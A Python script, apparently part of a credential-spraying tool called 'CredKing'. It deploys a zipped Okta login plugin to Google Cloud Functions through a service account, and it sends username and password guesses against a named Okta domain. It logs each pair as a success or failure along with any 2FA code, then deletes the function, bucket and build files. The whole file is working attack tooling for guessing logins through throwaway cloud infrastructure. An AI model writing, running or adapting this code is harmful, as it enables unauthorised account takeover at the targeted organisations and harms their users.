#!/usr/bin/python3
import requests
import json
from googleapiclient.discovery import build
from google.oauth2 import service_account
from google.cloud import storage
from time import time
from pprint import pprint
from threading import Lock, Thread
lock = Lock()
import json, sys, random, string, ntpath, time, os, datetime, queue, shutil
import re
# TODO: Pass in service account file as an argument
sa_file = 'service-account.json'
credentials = service_account.Credentials.from_service_account_file(sa_file)

service = build('cloudfunctions','v1',credentials=credentials)

storage_service = build('storage','v1',credentials=credentials)

def log_entry(entry):
    ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
    print(f'[{ts}] {entry}')

def generate_random():
	seed = random.getrandbits(32)
	while True:
	   yield seed
	   seed += 1

# Uploading Code

# Creating a bucket
bucket_name = f"credking_{next(generate_random())}"
body = {'name': bucket_name}
log_entry(storage_service.buckets().insert(project=credentials.project_id,predefinedAcl="projectPrivate",body=body).execute())

# Uploading a file from a created bucket
storage_client = storage.Client(project=credentials.project_id,credentials=credentials)
bucket = storage_client.bucket(bucket_name)



def create_zip(plugin):
    plugin_path = 'plugins/{}/'.format(plugin)
    random_name = next(generate_random())
    build_zip = 'build/{}_{}.zip'.format(plugin, random_name)

    with lock:
        log_entry('Creating build deployment for plugin: {}'.format(plugin))
        shutil.make_archive(build_zip[0:-4], 'zip', plugin_path)

    return build_zip

def create_bucket(plugin):
    path = create_zip(plugin)
    blob = bucket.blob('test.zip')
    blob.upload_from_filename(path)
    object_url = f'gs://{blob.bucket.name}/{blob.name}'
    return object_url

sourceURL = create_bucket('okta')

# Get Locations
locations = service.projects().locations().list(name=f'projects/{credentials.project_id}').execute()
log_entry(len(locations['locations']))
#print(json.dumps(locations,indent=2))
log_entry(locations['locations'][0])

def create_function(function,function_name, source_url,location_name):
    # Create Function
    body =  {
            "name" : function_name,
            "availableMemoryMb": 128,
            "entryPoint": "lambda_handler",
            "description": "CredKing Function",
            "timeout": "60s",
            "runtime": "python37",
            "ingressSettings": "ALLOW_ALL",
            "maxInstances": 1,
            "sourceArchiveUrl": source_url,
            "httpsTrigger": {},
            "vpcConnector": "",
            "serviceAccountEmail": credentials.service_account_email
            }
    #function = service.projects().locations().functions()
    function_resp = function.create(location=location_name,body=body).execute()
    log_entry(f"Function Resp: {function_resp}")

    # TODO: Move the check out of this when threading
    # Get Status of the function and make sure that it is active
    while True:
        sleep = 5
        status = function.get(name=function_name).execute()
        if status['status'] == 'ACTIVE':
            break
        else:
            log_entry(f"Waiting {sleep} seconds for function to become ACTIVE")
            time.sleep(sleep)
    log_entry(f"Created Function: {function_name}")

# Calling the create function command
f_name = f'credking-function-{next(generate_random())}'
function_name = f"{locations['locations'][0]['name']}/functions/{f_name}"
log_entry(function_name)
function = service.projects().locations().functions()
log_entry(f"Creating Function: {function_name}")
create_function(function,function_name,sourceURL,locations['locations'][0]['name'])

def invoke_function(function,function_name,payload):
    response = function.call(name=function_name, body=payload).execute()
    return_payload = json.loads(response['result'])

    user, password = return_payload['username'], return_payload['password']
    code_2fa = return_payload['code']
    if return_payload['success']:
        # TODO: Add this back in when iterating
        #clear_credentials(user, password)
        log_entry('(SUCCESS) {} / {} -> Success! (2FA: {})'.format(user, password, code_2fa))
    else:
        log_entry('(FAILED) {} / {} -> Failed.'.format(user, password))

# Call Function
data = {"username": "test.test2", "password": "Spring2018", "useragent": "test", "args": {"oktadomain": "cardinalb2e.okta.com"}}
body = {"data": json.dumps(data)}
#log_entry(service.projects().locations().functions().call(name=function_name,body=body).execute())
invoke_function(function,function_name,body)

def delete_function(function,function_name):
    # Delete Function
    log_entry(service.projects().locations().functions().delete(name=function_name).execute())

def delete_bucket():
    # Delete Code
    blob = bucket.blob('test.zip')
    blob.delete()
    bucket.delete()

def delete_zip():
    # Delete Zip
    filelist = [ f for f in os.listdir('build') if f.endswith(".zip") ]
    for f in filelist:
        os.remove(os.path.join('build', f))
        log_entry(f"Removing file {f}")

delete_function(function,function_name)
delete_bucket()
delete_zip()

# TODO: Parameterize above
# TODO: Create a main method

# TODO: Thread the above code
